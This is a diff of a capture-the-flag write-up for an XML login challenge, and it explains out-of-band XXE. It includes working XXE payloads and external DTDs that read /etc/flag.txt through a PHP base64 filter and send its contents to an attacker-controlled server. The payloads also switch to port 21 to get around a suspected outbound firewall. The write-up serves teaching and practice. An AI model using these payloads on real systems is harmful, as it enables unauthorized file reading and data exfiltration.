@@ -226,9 +226,9 @@ Now that we have established some prerequisites regarding XML we can proceed to 
 
 There are mainly 3 types of XXE attacks. Inband XXE, Error Based XXE and Out-of-Band XXE (OOB-XXE).
 
-In an Inband XXE the result will be directly shown on the user. Previous testing shows us that no output is rendered to the webpage
+In an Inband XXE the result will be directly shown to the user. Previous testing shows us that no output is rendered to the webpage.
 
-As we previously tried to authenticate as admin, we were greeted with the error message `Username or password not found! Try Harder!`. As we can see, we get no output based on our input. This means that we can leave out Inband XXE, since that doesn't seem to be possible in this scenario.
+As we previously tried to authenticate as admin, we were greeted with the error message `Username or password not found! Try Harder!`. As we can see, we get no output based on our input. This means that we can leave out Inband XXE, since that doesn't seem to be a possibility in this scenario.
 
 The second type of XXE attack is error based, but as we already noticed before, the error message is always the same whatever our input is. This renders error based XXE unusable.
 
@@ -238,11 +238,15 @@ Since we are working with Out-of-Band XXE we cannot see any results until we hav
 
 Now how would we be able to see the file contents of `/etc/flag.txt` when no data is rendered to the screen? One common method to overcome this problem is to exfiltrate data in the form of HTTP requests.
 
-We just need the server to do a simple HTTP GET request passing the file contents as a GET parameter to a webserver that we have access to. Let's try doing just that:
+When exfiltrating data over internet, it's a good practice to encode the data in some way to maintain the integrity of the data.
+
+We just need the server to do a simple HTTP GET request passing the encoded file contents as a GET parameter to a webserver that we have access to. The data encoding can be done for example with PHP's base64 filter.
+
+Let's see how that looks in practice:
 ```xml
 <?xml version="1.0" encoding="ISO-8859-1"?>
 <!DOCTYPE XXE [
-	<!ENTITY % flag SYSTEM "file:///etc/flag.txt">
+	<!ENTITY % flag SYSTEM "php://filter/convert.base64-encode/resource=/etc/flag.txt">
 	<!ENTITY % XXE "<!ENTITY exfil SYSTEM 'http://[IP REDACTED]/?flag=%flag;'>">
 	%XXE;
 ]>
@@ -251,9 +255,9 @@ We just need the server to do a simple HTTP GET request passing the file content
 </creds>
 ```
 
-This reads the file contents of `/etc/flag.txt` to a parameter entity `flag`. Then the XXE parameter entity defines a general entity, which is later on referenced in the XML body.
+This reads the file contents of `/etc/flag.txt` and converts them into base64. The encoded data is then saved to a parameter entity `flag`. After that the XXE parameter entity defines a general entity, which is later on referenced in the XML body.
 
-This should trigger the server to make a HTTP GET request to our webserver with passing the file contents as a GET parameter.
+This should trigger the server to make a HTTP GET request to our webserver passing the encoded file contents as a GET parameter.
 
 Let's quickly set up our webserver with `php -S 0.0.0.0:80`
 
@@ -272,7 +276,7 @@ Luckily this does not affect external parameter entities, so we can just use an 
 
 Let's start by creating a malicious DTD file that we are going to use:
 ```xml
-<!ENTITY % flag SYSTEM "file:///etc/flag.txt">
+<!ENTITY % flag SYSTEM "php://filter/convert.base64-encode/resource=/etc/flag.txt">
 <!ENTITY % XXE "<!ENTITY exfil SYSTEM 'http://[IP REDACTED]/?flag=%flag;'>">
 ```
 
@@ -290,3 +294,44 @@ Then let's create an XML document that will retrieve our external DTD:
 ```
 
 Now this should surely work.
+
+Let's spin up our server once again and send our payload.
+
+<img src="https://github.com/Sanduuz/CTFWriteUps/blob/master/challenge.fi/Web/Securelogin/attachments/php-server.png" width="500">
+
+Hmm... There's nothing coming through... Is the server really vulnerable to XXE?
+
+Before giving up, there's one last thing that we should try.
+
+The challenge description said that this challenge was based on a real world example of a finding from a bug bounty target. In these realistic scenarios the developers (hopefully) try to make their systems secure. This means that they might use different kinds of external protections e.g. Web Application Firewall (WAF).
+
+There is a possibility that the server has a WAF instance filtering outbound traffic on port 80. We can simply fuzz other common ports to see if this hypothesis stands. If the WAF is configured in a way that it filters outbound traffic only on port 80, there is a possibility that we could exfiltrate the data over another port.
+
+Some common ports that should be fuzzed include ports 21 (FTP), 22 (SSH), 23 (TELNET), 25 (SMTP), etc.
+
+Let's modify our payload a bit and try some of the common ports.
+
+Starting out with port 21, our external DTD looks like this:
+```xml
+<!ENTITY % flag SYSTEM "php://filter/convert.base64-encode/resource=/etc/flag.txt">
+<!ENTITY % XXE "<!ENTITY exfil SYSTEM 'http://[IP REDACTED]:21/?flag=%flag;'>">
+```
+
+and payload like this:
+```xml
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE XXE [
+	<!ENTITY % dtd SYSTEM "http://[IP REDACTED]:21/malicious.dtd">
+	%dtd;
+	%XXE;
+]>
+<creds>
+	&exfil;
+</creds>
+```
+
+This time when starting up our webserver, instead of the standard HTTP port 80, we need to bind it to listen on port 21.
+
+`php -S 0.0.0.0:21`
+
+<img src="https://github.com/Sanduuz/CTFWriteUps/blob/master/challenge.fi/Web/Securelogin/attachments/php-server-21.png" width="500">
